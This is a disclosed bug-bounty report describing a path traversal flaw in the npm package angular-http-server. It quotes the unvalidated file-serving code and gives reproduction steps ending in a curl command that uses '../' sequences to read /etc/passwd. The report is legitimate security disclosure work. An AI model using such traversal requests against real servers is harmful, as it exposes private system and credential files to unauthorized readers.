# [angular-http-server] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server

## Report Details
- **Report ID**: 309120
- **URL**: https://hackerone.com/reports/309120
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-01-25T19:45:34.645Z
- **Disclosed**: 2018-03-01T22:14:10.111Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

**angular-http-server** (https://www.npmjs.com/package/angular-http-server) contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.

**Module:** 

A very simple application server designed for Single Page App (SPA) developers.
(https://www.npmjs.com/package/angular-http-server)


**Description**

angular-http-server does not sanitize path in the correct way, so ```curl``` can be used to retrieve content of any file from the remote server.

Vulnerable code in ```angular-http-server.js``` file (lines 66-82):

```javascript
fs.stat(possibleFilename, function(err, stats) {
        var fileBuffer;
        if (!err && stats.isFile()) {
            fileBuffer = fs.readFileSync(possibleFilename);
            let ct = mime.lookup(possibleFilename);
            console.log(`Sending ${possibleFilename} with Content-Type ${ct}`);
            res.writeHead(200, { 'Content-Type': ct });

        } else {
            console.log("Route %s, replacing with index.html", possibleFilename);
            fileBuffer = returnDistFile();
            res.writeHead(200, { 'Content-Type': 'text/html' });
        }

        res.write(fileBuffer);
        res.end();
    });
```

File with ```possibleFilename``` name is read and send with guessed mime type. No path or allowed mime type validation is implemented - if it's possible to read the file, code just does it.


## Steps To Reproduce:

- install ```angular-http-server```

```
$ npm install angular-http-server
```

- create static ```index.html``` file (required as starting point of an app:

```html
<html>

<head>
    <meta charset="utf8">
    <title>Index HTML</title>
</head>

<body>
    <div>
        <p>This is index.html :)</p>
    </div>
</body>

</html>
```

- run server in the same folder where ```index.html``` was created:

```
$ angular-http-server --path ./
```

- open the browser and go to ```127.0.0.1:8080``` You should see HTML output.

- from the terminal, execute folloiwng command (please adjust numbers of ../ to your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd
```

You should see the content of ```/etc/passwd``` file:

{F257351}

Also, in the ```angular-http-server``` log there is information about mime type of the file (```application/octet-stream```):

```
$ ./node_modules/angular-http-server/angular-http-server.js --path ./
Path specified: ./
Using index.html
Listening on 8080
Sending ../../../../../etc/passwd with Content-Type application/octet-stream

```



## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows malicious user to read content of any file on the machine where angular-http-server is running.

This might expose vectors to attack system with Remote Code Execution, reveals files with usernames and passwords and many other possibilites.

## Attachments
- 1.png
